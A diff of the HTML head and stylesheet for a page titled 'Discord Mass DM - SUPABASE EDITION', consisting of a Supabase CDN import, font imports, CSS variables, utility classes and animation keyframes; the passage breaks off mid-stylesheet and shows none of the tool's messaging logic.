@@ -3,40 +3,1838 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Mass DM - ULTIMATE</title>
+    <title>Discord Mass DM - SUPABASE EDITION</title>
+    
+    <!-- Supabase CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
     <style>
-        * {
+        /* ==================== IMPORT POLICES ==================== */
+        @import url('https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,200..800;1,200..800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Clash+Display:wght@200;300;400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Calistoga&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Righteous&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Lobster&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');
+        
+        /* ==================== RESET CSS COMPLET ==================== */
+        *, *::before, *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
         }
 
-        :root {
-            --bg-dark: #0a0c15;
-            --bg-card: rgba(18, 22, 36, 0.98);
-            --bg-secondary: #1e2438;
-            --bg-tertiary: #2a314a;
-            --accent: #5865f2;
-            --success: #3ba55d;
-            --warning: #faa81a;
-            --danger: #ed4245;
-            --premium: #ff73fa;
-            --text: #ffffff;
-            --text-secondary: #b0b9e0;
-            --border: rgba(255, 255, 255, 0.08);
+        html {
+            font-size: 16px;
+            scroll-behavior: smooth;
+            -webkit-text-size-adjust: 100%;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizeLegibility;
         }
 
         body {
-            background: radial-gradient(circle at 20% 30%, #1e2640, #0a0c15);
-            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.5;
             min-height: 100vh;
-            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
         }
 
+        /* ==================== VARIABLES GLOBALES ULTRA COMPLÈTES ==================== */
+        :root {
+            /* Couleurs primaires - Palette complète 100 couleurs */
+            --primary-50: #eef2ff;
+            --primary-100: #e0e7ff;
+            --primary-200: #c7d2fe;
+            --primary-300: #a5b4fc;
+            --primary-400: #818cf8;
+            --primary-500: #6366f1;
+            --primary-600: #5865f2;
+            --primary-700: #4f46e5;
+            --primary-800: #4338ca;
+            --primary-900: #3730a3;
+            --primary-950: #1e1b4b;
+            
+            /* Couleurs de succès */
+            --success-50: #f0fdf4;
+            --success-100: #dcfce7;
+            --success-200: #bbf7d0;
+            --success-300: #86efac;
+            --success-400: #4ade80;
+            --success-500: #22c55e;
+            --success-600: #16a34a;
+            --success-700: #15803d;
+            --success-800: #166534;
+            --success-900: #14532d;
+            --success-950: #052e16;
+            
+            /* Couleurs d'erreur */
+            --error-50: #fef2f2;
+            --error-100: #fee2e2;
+            --error-200: #fecaca;
+            --error-300: #fca5a5;
+            --error-400: #f87171;
+            --error-500: #ef4444;
+            --error-600: #dc2626;
+            --error-700: #b91c1c;
+            --error-800: #991b1b;
+            --error-900: #7f1d1d;
+            --error-950: #450a0a;
+            
+            /* Couleurs d'avertissement */
+            --warning-50: #fffbeb;
+            --warning-100: #fef3c7;
+            --warning-200: #fde68a;
+            --warning-300: #fcd34d;
+            --warning-400: #fbbf24;
+            --warning-500: #f59e0b;
+            --warning-600: #d97706;
+            --warning-700: #b45309;
+            --warning-800: #92400e;
+            --warning-900: #78350f;
+            --warning-950: #422006;
+            
+            /* Couleurs premium */
+            --premium-50: #faf5ff;
+            --premium-100: #f3e8ff;
+            --premium-200: #e9d5ff;
+            --premium-300: #d8b4fe;
+            --premium-400: #c084fc;
+            --premium-500: #a855f7;
+            --premium-600: #9333ea;
+            --premium-700: #7e22ce;
+            --premium-800: #6b21a8;
+            --premium-900: #581c87;
+            --premium-950: #2e1065;
+            
+            /* Couleurs d'information */
+            --info-50: #eff6ff;
+            --info-100: #dbeafe;
+            --info-200: #bfdbfe;
+            --info-300: #93c5fd;
+            --info-400: #60a5fa;
+            --info-500: #3b82f6;
+            --info-600: #2563eb;
+            --info-700: #1d4ed8;
+            --info-800: #1e40af;
+            --info-900: #1e3a8a;
+            --info-950: #172554;
+            
+            /* Couleurs neutres - Palette complète */
+            --neutral-50: #fafafa;
+            --neutral-100: #f5f5f5;
+            --neutral-200: #e5e5e5;
+            --neutral-300: #d4d4d4;
+            --neutral-400: #a3a3a3;
+            --neutral-500: #737373;
+            --neutral-600: #525252;
+            --neutral-700: #404040;
+            --neutral-800: #262626;
+            --neutral-900: #171717;
+            --neutral-950: #0a0a0a;
+            
+            /* Couleurs de fond */
+            --bg-primary: #0a0c15;
+            --bg-secondary: #12141f;
+            --bg-tertiary: #1a1d2b;
+            --bg-card: rgba(18, 22, 36, 0.95);
+            --bg-card-hover: rgba(26, 30, 46, 0.98);
+            --bg-input: #1e2230;
+            --bg-input-hover: #232837;
+            --bg-overlay: rgba(0, 0, 0, 0.7);
+            --bg-overlay-light: rgba(255, 255, 255, 0.05);
+
+            /* Couleurs de texte */
+            --text-primary: #ffffff;
+            --text-secondary: #9fa6c2;
+            --text-tertiary: #6f7a9f;
+            --text-muted: #4b5470;
+            --text-inverse: #000000;
+            --text-accent: var(--primary-600);
+            --text-success: var(--success-500);
+            --text-error: var(--error-500);
+            --text-warning: var(--warning-500);
+            --text-premium: var(--premium-500);
+
+            /* Bordures */
+            --border-light: rgba(255, 255, 255, 0.05);
+            --border-medium: rgba(255, 255, 255, 0.1);
+            --border-heavy: rgba(255, 255, 255, 0.15);
+            --border-accent: var(--primary-600);
+            --border-success: var(--success-500);
+            --border-error: var(--error-500);
+            --border-warning: var(--warning-500);
+            --border-premium: var(--premium-500);
+
+            /* Ombres */
+            --shadow-xs: 0 2px 4px rgba(0, 0, 0, 0.02);
+            --shadow-sm: 0 4px 6px rgba(0, 0, 0, 0.05);
+            --shadow-md: 0 10px 15px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 20px 25px rgba(0, 0, 0, 0.15);
+            --shadow-xl: 0 25px 50px rgba(0, 0, 0, 0.25);
+            --shadow-2xl: 0 30px 60px rgba(0, 0, 0, 0.3);
+            --shadow-inner: inset 0 2px 4px rgba(0, 0, 0, 0.05);
+            --shadow-glow: 0 0 20px rgba(88, 101, 242, 0.3);
+            --shadow-glow-premium: 0 0 30px rgba(168, 85, 247, 0.4);
+            --shadow-glow-error: 0 0 20px rgba(239, 68, 68, 0.3);
+            --shadow-glow-success: 0 0 20px rgba(34, 197, 94, 0.3);
+            --shadow-glow-warning: 0 0 20px rgba(245, 158, 11, 0.3);
+            --shadow-glow-info: 0 0 20px rgba(59, 130, 246, 0.3);
+
+            /* Animations */
+            --transition-fast: 150ms cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-base: 250ms cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-slow: 350ms cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-bounce: 500ms cubic-bezier(0.34, 1.56, 0.64, 1);
+            --transition-elastic: 600ms cubic-bezier(0.68, -0.55, 0.265, 1.55);
+
+            /* Breakpoints */
+            --screen-xs: 375px;
+            --screen-sm: 640px;
+            --screen-md: 768px;
+            --screen-lg: 1024px;
+            --screen-xl: 1280px;
+            --screen-2xl: 1536px;
+            --screen-3xl: 1920px;
+
+            /* Z-index */
+            --z-dropdown: 1000;
+            --z-sticky: 1020;
+            --z-fixed: 1030;
+            --z-modal-backdrop: 1040;
+            --z-modal: 1050;
+            --z-popover: 1060;
+            --z-tooltip: 1070;
+            --z-toast: 1080;
+            --z-loader: 1090;
+        }
+
+        /* ==================== STYLES DE BASE ==================== */
+        body {
+            background: radial-gradient(circle at 0% 0%, #1a1f35, #0b0c14 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            padding: clamp(12px, 2vw, 24px);
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDgwIDgwIj48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxwYXRoIGQ9Ik0wIDBoODB2ODBIMHoiLz48cGF0aCBkPSJNNDAgMjBhMjAgMjAgMCAxIDAgMCA0MCAyMCAyMCAwIDAgMCAwLTQweiIgc3Ryb2tlPSIjMjIyQjRCIiBzdHJva2Utd2lkdGg9IjIiLz48L2c+PC9zdmc+');
+            opacity: 0.05;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* ==================== SYSTÈME DE GRILLE RESPONSIVE ULTRA COMPLET ==================== */
         .container {
-            max-width: 1400px;
+            width: 100%;
+            max-width: 1440px;
             margin: 0 auto;
+            padding: 0 clamp(12px, 4vw, 32px);
+            position: relative;
+            z-index: 1;
+        }
+
+        .container-fluid {
+            width: 100%;
+            padding: 0 clamp(12px, 4vw, 32px);
+        }
+
+        .grid {
+            display: grid;
+            gap: clamp(12px, 2vw, 24px);
+        }
+
+        /* Grilles responsives */
+        .grid-cols-1 { grid-template-columns: repeat(1, 1fr); }
+        .grid-cols-2 { grid-template-columns: repeat(2, 1fr); }
+        .grid-cols-3 { grid-template-columns: repeat(3, 1fr); }
+        .grid-cols-4 { grid-template-columns: repeat(4, 1fr); }
+        .grid-cols-5 { grid-template-columns: repeat(5, 1fr); }
+        .grid-cols-6 { grid-template-columns: repeat(6, 1fr); }
+        .grid-cols-7 { grid-template-columns: repeat(7, 1fr); }
+        .grid-cols-8 { grid-template-columns: repeat(8, 1fr); }
+        .grid-cols-9 { grid-template-columns: repeat(9, 1fr); }
+        .grid-cols-10 { grid-template-columns: repeat(10, 1fr); }
+        .grid-cols-11 { grid-template-columns: repeat(11, 1fr); }
+        .grid-cols-12 { grid-template-columns: repeat(12, 1fr); }
+
+        /* Grilles automatiques */
+        .grid-auto-fit {
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        }
+
+        .grid-auto-fill {
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+        }
+
+        /* Media queries pour les grilles */
+        @media (max-width: 1536px) {
+            .grid-cols-7, .grid-cols-8, .grid-cols-9, .grid-cols-10, .grid-cols-11, .grid-cols-12 {
+                grid-template-columns: repeat(6, 1fr);
+            }
+        }
+
+        @media (max-width: 1280px) {
+            .grid-cols-5, .grid-cols-6, .grid-cols-7, .grid-cols-8, .grid-cols-9, .grid-cols-10, .grid-cols-11, .grid-cols-12 {
+                grid-template-columns: repeat(4, 1fr);
+            }
+        }
+
+        @media (max-width: 1024px) {
+            .grid-cols-4, .grid-cols-5, .grid-cols-6, .grid-cols-7, .grid-cols-8, .grid-cols-9, .grid-cols-10, .grid-cols-11, .grid-cols-12 {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .grid-cols-3, .grid-cols-4, .grid-cols-5, .grid-cols-6, .grid-cols-7, .grid-cols-8, .grid-cols-9, .grid-cols-10, .grid-cols-11, .grid-cols-12 {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .grid-cols-2, .grid-cols-3, .grid-cols-4, .grid-cols-5, .grid-cols-6, .grid-cols-7, .grid-cols-8, .grid-cols-9, .grid-cols-10, .grid-cols-11, .grid-cols-12 {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* ==================== FLEXBOX UTILITIES ULTRA COMPLET ==================== */
+        .flex { display: flex; }
+        .inline-flex { display: inline-flex; }
+        .flex-col { flex-direction: column; }
+        .flex-row { flex-direction: row; }
+        .flex-col-reverse { flex-direction: column-reverse; }
+        .flex-row-reverse { flex-direction: row-reverse; }
+        .flex-wrap { flex-wrap: wrap; }
+        .flex-wrap-reverse { flex-wrap: wrap-reverse; }
+        .flex-nowrap { flex-wrap: nowrap; }
+
+        /* Alignements */
+        .items-start { align-items: flex-start; }
+        .items-center { align-items: center; }
+        .items-end { align-items: flex-end; }
+        .items-stretch { align-items: stretch; }
+        .items-baseline { align-items: baseline; }
+
+        .justify-start { justify-content: flex-start; }
+        .justify-center { justify-content: center; }
+        .justify-end { justify-content: flex-end; }
+        .justify-between { justify-content: space-between; }
+        .justify-around { justify-content: space-around; }
+        .justify-evenly { justify-content: space-evenly; }
+
+        .content-start { align-content: flex-start; }
+        .content-center { align-content: center; }
+        .content-end { align-content: flex-end; }
+        .content-between { align-content: space-between; }
+        .content-around { align-content: space-around; }
+        .content-stretch { align-content: stretch; }
+
+        .self-start { align-self: flex-start; }
+        .self-center { align-self: center; }
+        .self-end { align-self: flex-end; }
+        .self-stretch { align-self: stretch; }
+        .self-auto { align-self: auto; }
+
+        /* Gaps */
+        .gap-0 { gap: 0; }
+        .gap-1 { gap: 4px; }
+        .gap-2 { gap: 8px; }
+        .gap-3 { gap: 12px; }
+        .gap-4 { gap: 16px; }
+        .gap-5 { gap: 20px; }
+        .gap-6 { gap: 24px; }
+        .gap-8 { gap: 32px; }
+        .gap-10 { gap: 40px; }
+        .gap-12 { gap: 48px; }
+        .gap-16 { gap: 64px; }
+
+        .gap-x-0 { column-gap: 0; }
+        .gap-x-1 { column-gap: 4px; }
+        .gap-x-2 { column-gap: 8px; }
+        .gap-x-3 { column-gap: 12px; }
+        .gap-x-4 { column-gap: 16px; }
+        .gap-x-5 { column-gap: 20px; }
+        .gap-x-6 { column-gap: 24px; }
+
+        .gap-y-0 { row-gap: 0; }
+        .gap-y-1 { row-gap: 4px; }
+        .gap-y-2 { row-gap: 8px; }
+        .gap-y-3 { row-gap: 12px; }
+        .gap-y-4 { row-gap: 16px; }
+        .gap-y-5 { row-gap: 20px; }
+        .gap-y-6 { row-gap: 24px; }
+
+        /* ==================== ESPACEMENTS ULTRA COMPLET ==================== */
+        /* Margins */
+        .m-0 { margin: 0; }
+        .m-1 { margin: 4px; }
+        .m-2 { margin: 8px; }
+        .m-3 { margin: 12px; }
+        .m-4 { margin: 16px; }
+        .m-5 { margin: 20px; }
+        .m-6 { margin: 24px; }
+        .m-8 { margin: 32px; }
+        .m-10 { margin: 40px; }
+        .m-12 { margin: 48px; }
+        .m-16 { margin: 64px; }
+        .m-auto { margin: auto; }
+
+        .mt-0 { margin-top: 0; }
+        .mt-1 { margin-top: 4px; }
+        .mt-2 { margin-top: 8px; }
+        .mt-3 { margin-top: 12px; }
+        .mt-4 { margin-top: 16px; }
+        .mt-5 { margin-top: 20px; }
+        .mt-6 { margin-top: 24px; }
+        .mt-8 { margin-top: 32px; }
+        .mt-10 { margin-top: 40px; }
+        .mt-12 { margin-top: 48px; }
+        .mt-16 { margin-top: 64px; }
+        .mt-auto { margin-top: auto; }
+
+        .mb-0 { margin-bottom: 0; }
+        .mb-1 { margin-bottom: 4px; }
+        .mb-2 { margin-bottom: 8px; }
+        .mb-3 { margin-bottom: 12px; }
+        .mb-4 { margin-bottom: 16px; }
+        .mb-5 { margin-bottom: 20px; }
+        .mb-6 { margin-bottom: 24px; }
+        .mb-8 { margin-bottom: 32px; }
+        .mb-10 { margin-bottom: 40px; }
+        .mb-12 { margin-bottom: 48px; }
+        .mb-16 { margin-bottom: 64px; }
+        .mb-auto { margin-bottom: auto; }
+
+        .ml-0 { margin-left: 0; }
+        .ml-1 { margin-left: 4px; }
+        .ml-2 { margin-left: 8px; }
+        .ml-3 { margin-left: 12px; }
+        .ml-4 { margin-left: 16px; }
+        .ml-5 { margin-left: 20px; }
+        .ml-6 { margin-left: 24px; }
+        .ml-8 { margin-left: 32px; }
+        .ml-10 { margin-left: 40px; }
+        .ml-12 { margin-left: 48px; }
+        .ml-16 { margin-left: 64px; }
+        .ml-auto { margin-left: auto; }
+
+        .mr-0 { margin-right: 0; }
+        .mr-1 { margin-right: 4px; }
+        .mr-2 { margin-right: 8px; }
+        .mr-3 { margin-right: 12px; }
+        .mr-4 { margin-right: 16px; }
+        .mr-5 { margin-right: 20px; }
+        .mr-6 { margin-right: 24px; }
+        .mr-8 { margin-right: 32px; }
+        .mr-10 { margin-right: 40px; }
+        .mr-12 { margin-right: 48px; }
+        .mr-16 { margin-right: 64px; }
+        .mr-auto { margin-right: auto; }
+
+        .mx-0 { margin-left: 0; margin-right: 0; }
+        .mx-1 { margin-left: 4px; margin-right: 4px; }
+        .mx-2 { margin-left: 8px; margin-right: 8px; }
+        .mx-3 { margin-left: 12px; margin-right: 12px; }
+        .mx-4 { margin-left: 16px; margin-right: 16px; }
+        .mx-5 { margin-left: 20px; margin-right: 20px; }
+        .mx-6 { margin-left: 24px; margin-right: 24px; }
+        .mx-auto { margin-left: auto; margin-right: auto; }
+
+        .my-0 { margin-top: 0; margin-bottom: 0; }
+        .my-1 { margin-top: 4px; margin-bottom: 4px; }
+        .my-2 { margin-top: 8px; margin-bottom: 8px; }
+        .my-3 { margin-top: 12px; margin-bottom: 12px; }
+        .my-4 { margin-top: 16px; margin-bottom: 16px; }
+        .my-5 { margin-top: 20px; margin-bottom: 20px; }
+        .my-6 { margin-top: 24px; margin-bottom: 24px; }
+        .my-auto { margin-top: auto; margin-bottom: auto; }
+
+        /* Paddings */
+        .p-0 { padding: 0; }
+        .p-1 { padding: 4px; }
+        .p-2 { padding: 8px; }
+        .p-3 { padding: 12px; }
+        .p-4 { padding: 16px; }
+        .p-5 { padding: 20px; }
+        .p-6 { padding: 24px; }
+        .p-8 { padding: 32px; }
+        .p-10 { padding: 40px; }
+        .p-12 { padding: 48px; }
+        .p-16 { padding: 64px; }
+
+        .pt-0 { padding-top: 0; }
+        .pt-1 { padding-top: 4px; }
+        .pt-2 { padding-top: 8px; }
+        .pt-3 { padding-top: 12px; }
+        .pt-4 { padding-top: 16px; }
+        .pt-5 { padding-top: 20px; }
+        .pt-6 { padding-top: 24px; }
+        .pt-8 { padding-top: 32px; }
+        .pt-10 { padding-top: 40px; }
+        .pt-12 { padding-top: 48px; }
+        .pt-16 { padding-top: 64px; }
+
+        .pb-0 { padding-bottom: 0; }
+        .pb-1 { padding-bottom: 4px; }
+        .pb-2 { padding-bottom: 8px; }
+        .pb-3 { padding-bottom: 12px; }
+        .pb-4 { padding-bottom: 16px; }
+        .pb-5 { padding-bottom: 20px; }
+        .pb-6 { padding-bottom: 24px; }
+        .pb-8 { padding-bottom: 32px; }
+        .pb-10 { padding-bottom: 40px; }
+        .pb-12 { padding-bottom: 48px; }
+        .pb-16 { padding-bottom: 64px; }
+
+        .pl-0 { padding-left: 0; }
+        .pl-1 { padding-left: 4px; }
+        .pl-2 { padding-left: 8px; }
+        .pl-3 { padding-left: 12px; }
+        .pl-4 { padding-left: 16px; }
+        .pl-5 { padding-left: 20px; }
+        .pl-6 { padding-left: 24px; }
+        .pl-8 { padding-left: 32px; }
+        .pl-10 { padding-left: 40px; }
+        .pl-12 { padding-left: 48px; }
+        .pl-16 { padding-left: 64px; }
+
+        .pr-0 { padding-right: 0; }
+        .pr-1 { padding-right: 4px; }
+        .pr-2 { padding-right: 8px; }
+        .pr-3 { padding-right: 12px; }
+        .pr-4 { padding-right: 16px; }
+        .pr-5 { padding-right: 20px; }
+        .pr-6 { padding-right: 24px; }
+        .pr-8 { padding-right: 32px; }
+        .pr-10 { padding-right: 40px; }
+        .pr-12 { padding-right: 48px; }
+        .pr-16 { padding-right: 64px; }
+
+        .px-0 { padding-left: 0; padding-right: 0; }
+        .px-1 { padding-left: 4px; padding-right: 4px; }
+        .px-2 { padding-left: 8px; padding-right: 8px; }
+        .px-3 { padding-left: 12px; padding-right: 12px; }
+        .px-4 { padding-left: 16px; padding-right: 16px; }
+        .px-5 { padding-left: 20px; padding-right: 20px; }
+        .px-6 { padding-left: 24px; padding-right: 24px; }
+
+        .py-0 { padding-top: 0; padding-bottom: 0; }
+        .py-1 { padding-top: 4px; padding-bottom: 4px; }
+        .py-2 { padding-top: 8px; padding-bottom: 8px; }
+        .py-3 { padding-top: 12px; padding-bottom: 12px; }
+        .py-4 { padding-top: 16px; padding-bottom: 16px; }
+        .py-5 { padding-top: 20px; padding-bottom: 20px; }
+        .py-6 { padding-top: 24px; padding-bottom: 24px; }
+
+        /* ==================== TYPOGRAPHIE ULTRA COMPLÈTE ==================== */
+        /* Tailles de police */
+        .text-xs { font-size: 0.75rem; line-height: 1rem; }
+        .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
+        .text-base { font-size: 1rem; line-height: 1.5rem; }
+        .text-lg { font-size: 1.125rem; line-height: 1.75rem; }
+        .text-xl { font-size: 1.25rem; line-height: 1.75rem; }
+        .text-2xl { font-size: 1.5rem; line-height: 2rem; }
+        .text-3xl { font-size: 1.875rem; line-height: 2.25rem; }
+        .text-4xl { font-size: 2.25rem; line-height: 2.5rem; }
+        .text-5xl { font-size: 3rem; line-height: 1; }
+        .text-6xl { font-size: 3.75rem; line-height: 1; }
+        .text-7xl { font-size: 4.5rem; line-height: 1; }
+        .text-8xl { font-size: 6rem; line-height: 1; }
+        .text-9xl { font-size: 8rem; line-height: 1; }
+
+        /* Polices */
+        .font-sans { font-family: 'Inter', sans-serif; }
+        .font-serif { font-family: 'Space Grotesk', serif; }
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
+        .font-display { font-family: 'Clash Display', sans-serif; }
+        .font-calistoga { font-family: 'Calistoga', cursive; }
+        .font-bebas { font-family: 'Bebas Neue', cursive; }
+        .font-righteous { font-family: 'Righteous', cursive; }
+        .font-lobster { font-family: 'Lobster', cursive; }
+        .font-pacifico { font-family: 'Pacifico', cursive; }
+
+        /* Poids */
+        .font-thin { font-weight: 100; }
+        .font-extralight { font-weight: 200; }
+        .font-light { font-weight: 300; }
+        .font-normal { font-weight: 400; }
+        .font-medium { font-weight: 500; }
+        .font-semibold { font-weight: 600; }
+        .font-bold { font-weight: 700; }
+        .font-extrabold { font-weight: 800; }
+        .font-black { font-weight: 900; }
+
+        /* Alignement */
+        .text-left { text-align: left; }
+        .text-center { text-align: center; }
+        .text-right { text-align: right; }
+        .text-justify { text-align: justify; }
+        .text-start { text-align: start; }
+        .text-end { text-align: end; }
+
+        /* Transformation */
+        .uppercase { text-transform: uppercase; }
+        .lowercase { text-transform: lowercase; }
+        .capitalize { text-transform: capitalize; }
+        .normal-case { text-transform: none; }
+
+        /* Décoration */
+        .underline { text-decoration: underline; }
+        .line-through { text-decoration: line-through; }
+        .no-underline { text-decoration: none; }
+        .underline-offset-1 { text-underline-offset: 1px; }
+        .underline-offset-2 { text-underline-offset: 2px; }
+        .underline-offset-4 { text-underline-offset: 4px; }
+
+        /* Couleurs de texte */
+        .text-primary { color: var(--text-primary); }
+        .text-secondary { color: var(--text-secondary); }
+        .text-tertiary { color: var(--text-tertiary); }
+        .text-muted { color: var(--text-muted); }
+        .text-accent { color: var(--primary-600); }
+        .text-success { color: var(--success-500); }
+        .text-error { color: var(--error-500); }
+        .text-warning { color: var(--warning-500); }
+        .text-premium { color: var(--premium-500); }
+        .text-info { color: var(--info-500); }
+
+        /* Dégradés de texte */
+        .text-gradient-primary {
+            background: linear-gradient(135deg, var(--primary-600), var(--primary-400));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .text-gradient-premium {
+            background: linear-gradient(135deg, var(--premium-500), var(--premium-400));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .text-gradient-success {
+            background: linear-gradient(135deg, var(--success-500), var(--success-400));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .text-gradient-error {
+            background: linear-gradient(135deg, var(--error-500), var(--error-400));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .text-gradient-warning {
+            background: linear-gradient(135deg, var(--warning-500), var(--warning-400));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .text-gradient-multi {
+            background: linear-gradient(135deg, var(--primary-600), var(--premium-500), var(--success-500));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gradient 6s ease infinite;
+        }
+
+        /* ==================== ANIMATIONS ULTRA COMPLÈTES ==================== */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInLeft {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes fadeInRight {
+            from {
+                opacity: 0;
+                transform: translateX(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes scaleIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes scaleOut {
+            from {
+                opacity: 1;
+                transform: scale(1);
+            }
+            to {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+        }
+
+        @keyframes rotateIn {
+            from {
+                opacity: 0;
+                transform: rotate(-180deg) scale(0.5);
+            }
+            to {
+                opacity: 1;
+                transform: rotate(0) scale(1);
+            }
+        }
+
+        @keyframes rotateOut {
+            from {
+                opacity: 1;
+                transform: rotate(0) scale(1);
+            }
+            to {
+                opacity: 0;
+                transform: rotate(180deg) scale(0.5);
+            }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(-100%); }
+            to { transform: translateX(0); }
+        }
+
+        @keyframes slideOut {
+            from { transform: translateX(0); }
+            to { transform: translateX(100%); }
+        }
+
+        @keyframes slideInUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+
+        @keyframes slideInDown {
+            from { transform: translateY(-100%); }
+            to { transform: translateY(0); }
+        }
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        @keyframes bounceX {
+            0%, 100% {
+                transform: translateX(0);
+            }
+            50% {
+                transform: translateX(10px);
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.7;
+                transform: scale(1.05);
+            }
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% {
+                box-shadow: 0 0 20px var(--primary-600);
+            }
+            50% {
+                box-shadow: 0 0 40px var(--primary-400);
+            }
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes ping {
+            75%, 100% {
+                transform: scale(2);
+                opacity: 0;
+            }
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0) rotate(0deg);
+            }
+            25% {
+                transform: translateY(-10px) rotate(2deg);
+            }
+            75% {
+                transform: translateY(10px) rotate(-2deg);
+            }
+        }
+
+        @keyframes shimmer {
+            0% {
+                background-position: -1000px 0;
+            }
+            100% {
+                background-position: 1000px 0;
+            }
+        }
+
+        @keyframes gradient {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        @keyframes borderGlow {
+            0%, 100% {
+                border-color: var(--primary-600);
+                box-shadow: 0 0 20px var(--primary-600);
+            }
+            50% {
+                border-color: var(--premium-500);
+                box-shadow: 0 0 30px var(--premium-500);
+            }
+        }
+
+        @keyframes textShine {
+            0% {
+                background-position: 0% 50%;
+            }
+            100% {
+                background-position: 200% 50%;
+            }
+        }
+
+        @keyframes wave {
+            0% {
+                transform: rotate(0deg);
+            }
+            10% {
+                transform: rotate(14deg);
+            }
+            20% {
+                transform: rotate(-8deg);
+            }
+            30% {
+                transform: rotate(14deg);
+            }
+            40% {
+                transform: rotate(-4deg);
+            }
+            50% {
+                transform: rotate(10deg);
+            }
+            60% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(0deg);
+            }
+        }
+
+        @keyframes blink {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        @keyframes heartbeat {
+            0% {
+                transform: scale(1);
+            }
+            14% {
+                transform: scale(1.3);
+            }
+            28% {
+                transform: scale(1);
+            }
+            42% {
+                transform: scale(1.3);
+            }
+            70% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes flip {
+            0% {
+                transform: perspective(400px) rotateY(0);
+            }
+            100% {
+                transform: perspective(400px) rotateY(360deg);
+            }
+        }
+
+        @keyframes swing {
+            20% {
+                transform: rotate(15deg);
+            }
+            40% {
+                transform: rotate(-10deg);
+            }
+            60% {
+                transform: rotate(5deg);
+            }
+            80% {
+                transform: rotate(-5deg);
+            }
+            100% {
+                transform: rotate(0deg);
+            }
+        }
+
+        @keyframes wobble {
+            0% {
+                transform: translateX(0%);
+            }
+            15% {
